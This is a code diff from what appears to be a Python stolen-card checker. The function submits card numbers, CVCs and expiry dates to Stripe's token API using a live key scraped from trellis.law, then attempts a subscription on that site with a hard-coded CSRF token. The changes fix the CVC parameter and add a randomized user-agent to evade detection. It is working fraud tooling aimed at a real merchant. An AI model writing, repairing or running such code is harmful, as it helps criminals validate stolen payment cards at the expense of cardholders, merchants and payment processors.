@@ -21,7 +21,7 @@ def Tele(ccx):
     
     user_agent = UserAgent().random
     
-    data = f'guid=d8e89c41-bd77-4d16-9216-d609823c13914c8545&muid=4f201248-fae5-4ef8-84af-7431fbc132a0f0f37a&sid=8cd75d21-fae5-4a22-929c-15f6ccd79a52a02186&referrer=https%3A%2F%2Ftrellis.law&time_on_page=33755&card[name]=John+Libertt&card[number]={n}&card[cvc]=,{cvc}&card[exp_month]=11&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fc0b5539ba7%3B+stripe-js-v3%2Fc0b5539ba7%3B+split-card-element&key=pk_live_4xBSuaxricW1SmAkbwdiYH9h'
+    data = f'guid=d8e89c41-bd77-4d16-9216-d609823c13914c8545&muid=4f201248-fae5-4ef8-84af-7431fbc132a0f0f37a&sid=8cd75d21-fae5-4a22-929c-15f6ccd79a52a02186&referrer=https%3A%2F%2Ftrellis.law&time_on_page=33755&card[name]=John+Libertt&card[number]={n}&card[cvc]={cvp}&card[exp_month]=11&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fc0b5539ba7%3B+stripe-js-v3%2Fc0b5539ba7%3B+split-card-element&key=pk_live_4xBSuaxricW1SmAkbwdiYH9h'
 
     response = requests.post('https://api.stripe.com/v1/tokens', data=data)
     try:
@@ -85,7 +85,7 @@ def Tele(ccx):
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    'user-agent': user_agent,
     'x-csrftoken': 's8u2Ph6T2J8pRftNmpCUEa1O8XKivW3KJ19KBEOgfO92JUr10dH8SFRMQPIvjtsI',
     'x-requested-with': 'XMLHttpRequest',
 }
@@ -93,7 +93,7 @@ def Tele(ccx):
     data = {
     "plan": "personal_0912_monthly",
     "token": id,
-    "csrfmiddlewaretoken":                         "s8u2Ph6T2J8pRftNmpCUEa1O8XKivW3KJ19KBEOgfO92JUr10dH8SFRMQPIvjtsI",
+    "csrfmiddlewaretoken": "s8u2Ph6T2J8pRftNmpCUEa1O8XKivW3KJ19KBEOgfO92JUr10dH8SFRMQPIvjtsI",
     "state": ["ca"],
     "add_on_ids": [""]
 }
